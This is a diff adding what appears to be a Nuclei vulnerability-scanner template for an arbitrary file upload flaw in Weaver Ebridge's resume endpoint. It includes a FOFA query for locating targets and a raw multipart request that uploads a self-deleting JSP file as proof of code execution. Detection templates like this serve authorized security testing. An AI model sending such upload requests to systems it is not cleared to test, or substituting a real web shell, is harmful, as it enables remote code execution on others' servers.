@@ -1,0 +1,46 @@
+id: ebridge-addResume-arbitrary-file-upload
+
+info:
+  name: Weaver Ebridge Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    Weaver Ebridge system's `/wxclient/app/recruit/resume/addResume` endpoint has an arbitrary file upload vulnerability that allows attackers to upload malicious files to the server and potentially execute arbitrary code.
+  reference:
+    - https://mp.weixin.qq.com/s/b8Qsfrg1vnWlyOnuQqCzeg
+  metadata:
+    fofa-query: 'app="泛微-云桥e-Bridge"'
+  tags: weaver, file-upload, rce, ebridge
+
+variables:
+  filename1: "{{rand_base(6)}}"
+  filename2: "{{rand_base(6)}}"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  boundary: "{{rand_base(34)}}"
+
+http:
+  - raw:
+      - |
+        POST /wxclient/app/recruit/resume/addResume?fileElementId={{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename2}}.jsp"
+        Content-Type: application/octet-stream
+
+        {{randstr}}
+        ------{{boundary}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'success')
+        condition: and
